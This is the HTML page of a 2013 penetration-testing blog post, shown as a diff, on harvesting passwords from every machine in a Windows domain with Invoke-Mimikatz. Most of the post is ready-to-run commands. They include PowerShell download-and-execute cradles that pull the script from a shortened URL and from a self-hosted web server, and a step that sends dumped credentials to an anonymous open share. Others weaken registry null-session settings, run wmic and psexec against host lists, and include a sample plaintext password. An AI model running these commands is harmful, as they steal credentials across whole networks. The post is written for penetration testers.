@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dumping a domain worth of passwords with mimikatz - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Dumping a domain worth of passwords with mimikatz" />
+<meta property="og:description" content="clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
+You can very easily use this script directly from an admin command prompt as so:
+powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2013-10-05T23:53:52-05:00" />
+<meta property="article:modified_time" content="2013-10-05T23:53:52-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Dumping a domain worth of passwords with mimikatz"/>
+<meta name="twitter:description" content="clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
+You can very easily use this script directly from an admin command prompt as so:
+powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" /><link rel="prev" href="https://malicious.link/posts/2013/ad-zone-transfers-as-a-user/" /><link rel="next" href="https://malicious.link/posts/2014/2014-01-06-metasploit-minute-mondays-with-mubix/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dumping a domain worth of passwords with mimikatz",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2013\/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz\/"
+        },"genre": "posts","wordcount":  644 ,
+        "url": "https:\/\/malicious.link\/posts\/2013\/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz\/","datePublished": "2013-10-05T23:53:52-05:00","dateModified": "2013-10-05T23:53:52-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Rob Fuller"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dumping a domain worth of passwords with mimikatz</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span>&nbsp;<span class="post-category">included in <a href="/categories/mimikatz/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>mimikatz</a>&nbsp;<a href="/categories/cli/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>cli</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2013-10-05">2013-10-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;644 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p><a href="http://clymb3r.wordpress.com/" target="_blank" rel="noopener noreffer ">clymb3r</a> recently posted a script called &ldquo;<a href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz" target="_blank" rel="noopener noreffer ">Invoke-Mimikatz.ps1</a>&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.</p>
+<p>You can very easily use this script directly from an admin command prompt as so:</p>
+<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot;
+</code></pre>
+<p>(This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember)
+This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.</p>
+<p>One of the awesome added capabilities for this script is to run on a list of hosts. as so:</p>
+<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds -ComputerName @('computer1', 'computer2')&quot;
+</code></pre>
+<p>This works great as all the output is directly on your system and all executed through Powershell Remoting. <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ee706585%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">Powershell Remoting</a> is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not.</p>
+<p>You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS).</p>
+<p>If you find that your target isn&rsquo;t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it &ldquo;Mass Mimikatz&rdquo;</p>
+<p>Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script:</p>
+<pre><code>cd\
+mkdir open
+net share open=C:\open /grant:everyone,full
+icacls C:\open\ /grant Everyone:(OI)(CI)F /t
+</code></pre>
+<p>We are setting &ldquo;Everyone&rdquo; permissions on a Share (net share) and NTFS (icacls) level for this to work properly.</p>
+<p>Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the &ldquo;Everyone&rdquo; token so that we don&rsquo;t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: <a href="https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb" target="_blank" rel="noopener noreffer ">massmimi_reg.rb</a>
+or you can just make the following changes&quot;</p>
+<pre><code>HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ  = open
+HKLM\System\CurrentControlSet\Contol\Lsa &quot;EveryoneIncludesAnonymous&quot; = 1
+</code></pre>
+<p>Step 3. Change directory into new &ldquo;open&rdquo; directory. This is so our uploads and in particular our web server will be hosted out of the correct directory.</p>
+<p>Step 4. Upload powershell script <a href="https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd" target="_blank" rel="noopener noreffer ">powermeup.cmd</a> - this script will run our hosted Invoke-Mimikatz script on each host:</p>
+<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.127:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.127\open\%COMPUTERNAME%.txt 2&gt;&amp;1
+</code></pre>
+<p>Step 5. Upload <a href="http://clymb3r.wordpress.com/" target="_blank" rel="noopener noreffer ">clymb3r</a>&rsquo;s Invoke-Mimikatz ps1 - Download from <a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="noopener noreffer ">PowerSploit</a> repo: <a href="https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener noreffer ">source on github</a></p>
+<p>Step 6. Upload mongoose: <a href="http://cesanta.com/downloads.html" target="_blank" rel="noopener noreffer ">Downloads Page</a> - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.</p>
+<p>Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&rsquo;ll have to gather this one way or another.</p>
+<p>Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default</p>
+<p>Step 9a. Execute wmic:</p>
+<pre><code>wmic /node:@serverlist.txt process call create &quot;\\192.168.92.127\open\powershellme.cmd&quot;
+</code></pre>
+<p>Step 9b. Execute wmic with creds:</p>
+<pre><code>wmic /node:@serverlist.txt /user:PROJECTMENTOR\jdoe /password:ASDqwe123 process call create &quot;\\192.168.92.127\open\powershellme.cmd&quot;
+</code></pre>
+<p>Step 10. Watch as text files full of wonder and joy fill your share.</p>
+<p>You can find the scripts here: <a href="https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz" target="_blank" rel="noopener noreffer ">https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz</a></p>
+<p>Don&rsquo;t forget to clean up::</p>
+<ol>
+<li>kill mongoose process</li>
+<li>net share open /delete</li>
+<li>kill/reset registry values</li>
+<li>delete &ldquo;open&rdquo; directory</li>
+</ol>
+<p>Got a better way of getting this done? Please leave a comment.</p>
+<p>P.S. You could just enable Powershell Remoting for them ;)</p>
+<pre><code>psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &quot;enable-psremoting -force&quot;
+</code></pre>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/postimages/201310_multimimi_1.png"
+        data-srcset="/images/postimages/201310_multimimi_1.png, /images/postimages/201310_multimimi_1.png 1.5x, /images/postimages/201310_multimimi_1.png 2x"
+        data-sizes="auto"
+        alt="/images/postimages/201310_multimimi_1.png"
+        title="/images/postimages/201310_multimimi_1.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2013-10-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" data-title="Dumping a domain worth of passwords with mimikatz" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" data-title="Dumping a domain worth of passwords with mimikatz"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" data-title="Dumping a domain worth of passwords with mimikatz"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" data-title="Dumping a domain worth of passwords with mimikatz"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/" data-title="Dumping a domain worth of passwords with mimikatz"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2013/ad-zone-transfers-as-a-user/" class="prev" rel="prev" title="AD Zone Transfers as a user"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>AD Zone Transfers as a user</a>
+            <a href="/posts/2014/2014-01-06-metasploit-minute-mondays-with-mubix/" class="next" rel="next" title="Metasploit Minute - Mondays with Mubix - Episode 1">Metasploit Minute - Mondays with Mubix - Episode 1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
